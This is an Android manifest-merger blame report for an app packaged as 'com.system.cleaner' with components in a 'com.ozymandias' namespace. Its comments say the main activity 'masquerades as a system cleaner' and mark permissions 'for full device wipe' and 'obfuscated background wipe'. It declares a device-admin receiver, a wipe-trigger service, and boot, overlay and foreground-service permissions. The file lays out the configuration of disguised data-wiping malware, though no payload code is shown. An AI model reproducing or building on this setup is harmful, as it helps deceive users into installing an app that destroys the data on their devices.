app/build/intermediates/manifest_merge_blame_file/debug/processDebugMainManifest/manifest-merger-blame-debug-report.txt
1<?xml version="1.0" encoding="utf-8"?>
2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
3    package="com.system.cleaner"
4    android:versionCode="1"
5    android:versionName="1.0.0-beta" >
6
7    <uses-sdk
8        android:minSdkVersion="23"
9        android:targetSdkVersion="34" />
10
11    <!-- Permissions for full device wipe -->
12    <uses-permission
12-->src\main\AndroidManifest.xml:5:5-6:38
13        android:name="android.permission.MANAGE_DEVICE_POLICY_WIPE_DATA"
13-->src\main\AndroidManifest.xml:5:22-86
14        android:maxSdkVersion="34" />
14-->src\main\AndroidManifest.xml:6:9-35
15
16    <!-- For obfuscated background wipe -->
17    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
17-->src\main\AndroidManifest.xml:9:5-77
17-->src\main\AndroidManifest.xml:9:22-74
18    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
18-->src\main\AndroidManifest.xml:10:5-81
18-->src\main\AndroidManifest.xml:10:22-78
19    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
19-->src\main\AndroidManifest.xml:11:5-78
19-->src\main\AndroidManifest.xml:11:22-75
20
21    <permission
21-->[androidx.core:core:1.12.0] AndroidManifest.xml:22:5-24:47
22        android:name="com.system.cleaner.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
22-->[androidx.core:core:1.12.0] AndroidManifest.xml:23:9-81
23        android:protectionLevel="signature" />
23-->[androidx.core:core:1.12.0] AndroidManifest.xml:24:9-44
24
25    <uses-permission android:name="com.system.cleaner.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
25-->[androidx.core:core:1.12.0] AndroidManifest.xml:26:5-97
25-->[androidx.core:core:1.12.0] AndroidManifest.xml:26:22-94
26
27    <application
27-->src\main\AndroidManifest.xml:13:5-56:19
28        android:allowBackup="false"
28-->src\main\AndroidManifest.xml:14:9-36
29        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
29-->[androidx.core:core:1.12.0] AndroidManifest.xml:28:18-86
30        android:debuggable="true"
31        android:extractNativeLibs="false"
32        android:icon="@drawable/ic_launcher"
32-->src\main\AndroidManifest.xml:15:9-45
33        android:label="@string/app_name"
33-->src\main\AndroidManifest.xml:16:9-41
34        android:roundIcon="@drawable/ic_launcher"
34-->src\main\AndroidManifest.xml:17:9-50
35        android:supportsRtl="true"
35-->src\main\AndroidManifest.xml:18:9-35
36        android:theme="@style/Theme.Ozymandias"
36-->src\main\AndroidManifest.xml:19:9-48
37        android:usesCleartextTraffic="false" >
37-->src\main\AndroidManifest.xml:20:9-45
38
39        <!-- Main Activity - masquerades as a system cleaner -->
40        <activity
40-->src\main\AndroidManifest.xml:23:9-33:20
41            android:name="com.ozymandias.MainActivity"
41-->src\main\AndroidManifest.xml:24:13-41
42            android:excludeFromRecents="false"
42-->src\main\AndroidManifest.xml:26:13-47
43            android:exported="true"
43-->src\main\AndroidManifest.xml:25:13-36
44            android:launchMode="singleTop"
44-->src\main\AndroidManifest.xml:27:13-43
45            android:theme="@style/Theme.Ozymandias" >
45-->src\main\AndroidManifest.xml:28:13-52
46            <intent-filter>
46-->src\main\AndroidManifest.xml:29:13-32:29
47                <action android:name="android.intent.action.MAIN" />
47-->src\main\AndroidManifest.xml:30:17-69
47-->src\main\AndroidManifest.xml:30:25-66
48
49                <category android:name="android.intent.category.LAUNCHER" />
49-->src\main\AndroidManifest.xml:31:17-77
49-->src\main\AndroidManifest.xml:31:27-74
50            </intent-filter>
51        </activity>
52
53        <receiver
53-->src\main\AndroidManifest.xml:36:9-48:20
54            android:name="com.ozymandias.AdminReceiver"
54-->src\main\AndroidManifest.xml:37:13-42
55            android:exported="true"
55-->src\main\AndroidManifest.xml:38:13-36
56            android:permission="android.permission.BIND_DEVICE_ADMIN" >
56-->src\main\AndroidManifest.xml:39:13-70
57            <meta-data
57-->src\main\AndroidManifest.xml:40:13-42:65
58                android:name="android.app.device_admin"
58-->src\main\AndroidManifest.xml:41:17-56
59                android:resource="@xml/device_admin_policies" />
59-->src\main\AndroidManifest.xml:42:17-62
60
61            <intent-filter>
61-->src\main\AndroidManifest.xml:43:13-47:29
62                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
62-->src\main\AndroidManifest.xml:44:17-82
62-->src\main\AndroidManifest.xml:44:25-79
63                <action android:name="android.app.action.DEVICE_ADMIN_DISABLE_REQUESTED" />
63-->src\main\AndroidManifest.xml:45:17-92
63-->src\main\AndroidManifest.xml:45:25-89
64                <action android:name="android.app.action.DEVICE_ADMIN_DISABLED" />
64-->src\main\AndroidManifest.xml:46:17-83
64-->src\main\AndroidManifest.xml:46:25-80
65            </intent-filter>
66        </receiver>
67
68        <service
68-->src\main\AndroidManifest.xml:51:9-54:56
69            android:name="com.ozymandias.WipeTriggerService"
69-->src\main\AndroidManifest.xml:52:13-47
70            android:exported="false"
70-->src\main\AndroidManifest.xml:53:13-37
71            android:foregroundServiceType="dataSync" />
71-->src\main\AndroidManifest.xml:54:13-53
72
73        <provider
73-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:24:9-32:20
74            android:name="androidx.startup.InitializationProvider"
74-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:25:13-67
75            android:authorities="com.system.cleaner.androidx-startup"
75-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:26:13-68
76            android:exported="false" >
76-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:27:13-37
77            <meta-data
77-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:29:13-31:52
78                android:name="androidx.emoji2.text.EmojiCompatInitializer"
78-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:30:17-75
79                android:value="androidx.startup" />
79-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:31:17-49
80            <meta-data
80-->[androidx.lifecycle:lifecycle-process:2.4.1] AndroidManifest.xml:31:13-33:52
81                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
81-->[androidx.lifecycle:lifecycle-process:2.4.1] AndroidManifest.xml:32:17-78
82                android:value="androidx.startup" />
82-->[androidx.lifecycle:lifecycle-process:2.4.1] AndroidManifest.xml:33:17-49
83        </provider>
84    </application>
85
86</manifest>